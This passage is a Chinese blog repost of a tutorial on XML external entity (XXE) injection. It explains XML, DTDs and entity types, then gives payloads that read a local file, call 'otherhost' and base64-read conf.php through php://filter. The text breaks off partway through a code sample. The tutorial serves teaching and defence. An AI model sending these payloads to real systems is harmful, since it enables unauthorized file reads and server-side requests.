<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">



  
  
    
    
  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">







<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="web,security,XXE," />










<meta name="description" content="转载于： XML外部实体（XXE）注入详解 这应该我看见是关于XXE最全的讲解了 原博客排版实在有点难受，稍微修改了一下转载">
<meta property="og:type" content="article">
<meta property="og:title" content="XML外部实体（XXE）注入详解">
<meta property="og:url" content="https://scerush.github.io/2021/07/07/xml-wai-bu-shi-ti-zhu-ru-xxe-xiang-jie/index.html">
<meta property="og:site_name" content="SCERush">
<meta property="og:description" content="转载于： XML外部实体（XXE）注入详解 这应该我看见是关于XXE最全的讲解了 原博客排版实在有点难受，稍微修改了一下转载">
<meta property="og:locale">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233951266-1391283970.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233951558-1031010580.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233951931-1928071101.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233952226-1587590636.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233952957-1078183056.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233953379-398294404.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233953994-1588947301.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233954542-2024606606.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233955047-1196767811.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233955469-519270664.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233955858-717215866.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233956543-443383052.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233957447-1571114973.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233957877-1657490227.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233958580-263734513.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233958973-1207745091.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233959325-1531862688.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233959809-1910557713.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234000086-1047009681.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234000464-1584862609.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234001314-1820564764.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234001611-813303312.jpg">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234002046-762017045.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234002354-1423087805.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234002715-2028991902.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234003130-2143316555.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234003593-607819249.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234004229-1126252116.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234004709-1408752219.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234005064-610786387.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234005652-381623393.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234006905-1089289427.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234007386-48606999.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234008026-1355120168.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234008299-1543150332.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234008831-87419652.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234009115-5824616.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234009565-2028886204.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234010016-1338276588.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234010420-1047795442.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234010808-912600799.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234011163-155414255.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234011719-786727724.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234012120-420916652.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234012611-13895427.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234012895-1129528672.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234013408-983490916.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234013807-271963911.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234014187-1408086040.jpg">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234014565-1239811992.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234015041-2063598645.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234015397-734831734.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234015905-1773186333.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234016597-408254317.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234016907-1385955048.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234017645-1844719558.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234017931-1052519331.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234018770-1055065163.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234019593-2127027338.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234020052-1087958443.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234020464-1225045645.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234020864-1258198362.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234021122-1934005839.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234021503-1164417528.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234022195-1115935486.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234022769-149796291.jpg">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234023646-1916420480.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234024240-1596034491.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234024867-398864624.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234025731-1437163436.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234026456-529252416.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234026761-605104903.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234027524-1007628899.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234028207-1545319760.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234028788-1831295104.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234029443-757032783.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234029857-680764399.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234030199-924937140.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234030474-435817466.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234030805-1043264745.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234031093-1720687788.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234031603-77739970.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234031957-788519841.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234032448-1106270797.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234032841-290267868.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234033160-1253468769.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234033480-195265202.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234034123-1490055863.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234034679-762886948.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234035015-853668418.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234035380-906072955.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234036380-1451259729.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234036909-859563664.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234037728-182926868.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234038325-1132770022.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234038965-1332523326.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234039554-1590258656.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234040235-1100121240.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234040660-1835011432.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234041849-1178456086.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234042559-1178233194.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234043312-143061967.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234043904-345953687.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234044535-315848766.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234044835-1172179785.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234045366-819236429.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234045720-37310198.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234046082-612884704.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234046808-800824744.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234047287-387925438.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234047617-1097614616.gif">
<meta property="og:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234048357-485380033.gif">
<meta property="article:published_time" content="2021-07-07T01:35:27.000Z">
<meta property="article:modified_time" content="2021-07-07T01:47:04.037Z">
<meta property="article:author" content="SCERush">
<meta property="article:tag" content="web">
<meta property="article:tag" content="security">
<meta property="article:tag" content="XXE">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233951266-1391283970.gif">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://scerush.github.io/2021/07/07/xml-wai-bu-shi-ti-zhu-ru-xxe-xiang-jie/"/>





  <title>XML外部实体（XXE）注入详解 | SCERush</title>
  








<meta name="generator" content="Hexo 5.4.0"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">SCERush</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://scerush.github.io/2021/07/07/xml-wai-bu-shi-ti-zhu-ru-xxe-xiang-jie/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/blog.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SCERush">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">XML外部实体（XXE）注入详解</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-07-07T09:35:27+08:00">
                2021-07-07
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%BD%AC%E8%BD%BD/" itemprop="url" rel="index">
                    <span itemprop="name">转载</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  26.2k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  120
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <blockquote>
<p>转载于：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/9302528.html">XML外部实体（XXE）注入详解</a></p>
<p>这应该我看见是关于XXE最全的讲解了</p>
<p>原博客排版实在有点难受，稍微修改了一下转载</p>
</blockquote>
<span id="more"></span>
<h1 id="XML与XXE注入基础知识"><a href="#XML与XXE注入基础知识" class="headerlink" title="XML与XXE注入基础知识"></a>XML与XXE注入基础知识</h1><h2 id="1-XMl定义"><a href="#1-XMl定义" class="headerlink" title="1.XMl定义"></a>1.XMl定义</h2><p>XML由3个部分构成，它们分别是：文档类型定义（Document Type Definition，DTD），即XML的布局语言；可扩展的样式语言（Extensible Style Language，XSL），即XML的样式表语言；以及可扩展链接语言（Extensible Link Language，XLL）。</p>
<p>XML:可扩展标记语言，标准通用标记语言的子集，是一种用于标记电子文件使其具有结构性的标记语言。它被设计用来传输和存储数据(而不是储存数据),可扩展标记语言是一种很像超文本标记语言的标记语言。它的设计宗旨是传输数据，而不是显示数据。它的标签没有被预定义。您需要自行定义标签。它被设计为具有自我描述性。它是W3C的推荐标准。</p>
<p>可扩展标记语言(XML)和超文本标记语言(HTML)为不同的目的而设计</p>
<p>它被设计用来传输和存储数据，其焦点是数据的内容。</p>
<p>超文本标记语言被设计用来显示数据，其焦点是数据的外观</p>
<h2 id="2-XML的作用"><a href="#2-XML的作用" class="headerlink" title="2.XML的作用"></a>2.XML的作用</h2><p>XML使用元素和属性来描述数 据。在数据传送过程中，XML始终保留了诸如父/子关系这样的数据结构。几个应用程序 可以共享和解析同一个XML文件，不必使用传统的字符串解析或拆解过程。 相反，普通文件不对每个数据段做描述(除了在头文件中)，也不保留数据关系结构。使用XML做数据交换可以使应用程序更具有弹性，因为可以用位置(与普通文件一样)或用元素名(从数据库)来存取XML数据。</p>
<p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
&lt;!-- ⬆XML声明⬆ --&gt;

&lt;!DOCTYPE 文件名 [
&lt;!ENTITY实体名 &quot;实体内容&quot;&gt;
]&gt;
&lt;!-- ⬆文档类型定义(DTD)⬆ --&gt;

&lt;元素名称 category&#x3D;&quot;属性&quot;&gt;
文本或其他元素
&lt;&#x2F;元素名称&gt;
&lt;!-- ⬆文档元素⬆ --&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="3-XML格式说明"><a href="#3-XML格式说明" class="headerlink" title="3.XML格式说明"></a>3.XML格式说明</h2><p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233951266-1391283970.gif" alt="img"></p>
<p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</p>
<h3 id="（1）内部声明DTD"><a href="#（1）内部声明DTD" class="headerlink" title="（1）内部声明DTD"></a>（1）内部声明DTD</h3><p><code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p>
<h3 id="（2）引用外部DTD"><a href="#（2）引用外部DTD" class="headerlink" title="（2）引用外部DTD"></a>（2）引用外部DTD</h3><p><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code><br>或者<br><code>&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;</code></p>
<p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p>
<h3 id="（3）DTD的实体"><a href="#（3）DTD的实体" class="headerlink" title="（3）DTD的实体"></a>（3）DTD的实体</h3><h4 id="l-DTD的作用"><a href="#l-DTD的作用" class="headerlink" title="l DTD的作用"></a>l DTD的作用</h4><p>DTD（文档类型定义）的作用是定义XML文档的合法构建模块。DTD可以在XML文档内声明，也可以外部引用。</p>
<p>外部实体是指XML处理器必须解析的数据。它对于在多个文档之间创建共享的公共引用很有用。对外部实体进行的任何更改将在包含对其的引用的文档中自动更新。即XML使用外部实体将信息或“内容”将自动提取到XML文档的正文中。为此，我们需要在XML文档内部声明一个外部实体</p>
<p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。。我们可以在内部确定其值（内部子集）：</p>
<p><a target="_blank" rel="noopener" href="http://www.secpulse.com/wp-content/uploads/2017/06/113.png"><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233951558-1031010580.gif" alt="1"></a></p>
<p>或从外部来源：（外部子集）：</p>
<p><a target="_blank" rel="noopener" href="http://www.secpulse.com/wp-content/uploads/2017/06/29.png"><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233951931-1928071101.gif" alt="2"></a></p>
<p>注意到SYSTEM标识符没？该标识符意味着该实体将从外部来源获取内容，在本例中，该内容是“site.com”下的一个页面。</p>
<p>为了声明这些实体，我们需要在文档类型定义（DTD）中进行。DTD是一组标记声明，用于定义XML的文档类型。它定义了XML文档的合法结构块和具有合法元素和属性列表的文档结构。DTD可以在XML文档内部声明，也可以作为外部引用声明—使用SYSTEM标识符指向可解析位置中的另一组声明。ENTITY可以使用SYSTEM关键字,调用外部资源,而这里是支持很多的协议,如:http;file等，然后,在其他DoM结点中可以使用如:&test;引用该实体内容.</p>
<p>那么,如果在产品功能设计当中,解析的xml是由外部可控制的,那将可能形成,如:文件读取,DoS,CSRF等漏洞.</p>
<p>如果要引用一个外部资源,可以借助各种协议 几个例子:</p>
<p>file:///path/to/file.ext</p>
<p><a target="_blank" rel="noopener" href="http://url/file.ext">http://url/file.ext</a></p>
<p>php://filter/read=convert.base64-encode/resource=conf.php</p>
<p>我们来看一个DTD的例子，一个在DTD里面有一个SYSTEM标识符的实体：</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233952226-1587590636.gif" alt="img"></p>
<h4 id="l-内部声明实体"><a href="#l-内部声明实体" class="headerlink" title="l 内部声明实体"></a>l 内部声明实体</h4><p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p>
<p>一个内部实体声明</p>
<p><code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code></p>
<p>例子</p>
<p>DTD:</p>
<p><code>&lt;!ENTITY writer &quot;me&quot;&gt;</code></p>
<p>XML:</p>
<p><code>&lt;author&gt;&amp;writer;&lt;/author&gt;</code></p>
<p>注释: 一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</p>
<h4 id="l-引用外部实体"><a href="#l-引用外部实体" class="headerlink" title="l 引用外部实体"></a>l 引用外部实体</h4><p>一个外部实体声明</p>
<p><code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</code></p>
<p>或者</p>
<p><code>&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></p>
<p>例子</p>
<p>DTD:</p>
<p><code>&lt;!ENTITY writer SYSTEM &quot;http://example.com/dtd/writer.dtd&quot;&gt;</code></p>
<p>XML:</p>
<p><code>&lt;author&gt;&amp;writer;&lt;/author&gt;</code></p>
<p>外部实体类型有</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233952957-1078183056.gif" alt="xxe"></p>
<h3 id="（4）CDATA"><a href="#（4）CDATA" class="headerlink" title="（4）CDATA"></a>（4）CDATA</h3><p>CDATA 指的是不应由 XML 解析器进行解析的文本数据（Unparsed Character Data）。</p>
<p>在 XML 元素中，”&lt;” （新元素的开始）和 “&amp;” （字符实体的开始）是非法的。</p>
<p>某些文本，比如 JavaScript 代码，包含大量 “&lt;” 或 “&amp;” 字符。为了避免错误，可以将脚本代码定义为 CDATA。</p>
<p>CDATA 部分中的所有内容都会被解析器忽略。</p>
<p>CDATA 部分由 “<code>&lt;![CDATA[</code>“ 开始，由 “<code>]]&gt;</code>“ 结束</p>
<h2 id="4-XML的实体"><a href="#4-XML的实体" class="headerlink" title="4.XML的实体"></a>4.XML的实体</h2><p>XML 中的实体分为以下五种：字符实体，命名实体，外部实体，参数实体，内部实体，普通实体和参数实体都分为内部实体和外部实体两种，外部实体定义需要加上 SYSTEM关键字，其内容是URL所指向的外部文件实际的内容。如果不加SYSTEM关键字，则为内部实体，表示实体指代内容为字符串。</p>
<h3 id="（1）字符实体"><a href="#（1）字符实体" class="headerlink" title="（1）字符实体"></a>（1）字符实体</h3><p>指用十进制格式(<code>&amp;#aaa;</code>)或十六进制格式(<code>&amp;#xaaa;</code>)来指定任意 Unicode 字符。对 XML 解析器而言，字符实体与直接输入指定字符的效果完全相同。</p>
<h3 id="（2）命名实体"><a href="#（2）命名实体" class="headerlink" title="（2）命名实体"></a>（2）命名实体</h3><p>也称为内部实体，在 DTD 或内部子集（即文档中 &lt;!DOCTYPE&gt; 语句的一部分）中声明，在文档中用作引用。在 XML 文档解析过程中，实体引用将由它的表示替代。</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;
&lt;!DOCTYPE ANY [
&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;&#x2F;test&#x2F;1.txt&quot; &gt;]&gt;        
&lt;value&gt;&amp;xxe;&lt;&#x2F;value&gt;
&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;
&lt;!DOCTYPE ANY [
&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;otherhost&#x2F;xxxx.php&quot; &gt;]&gt;        
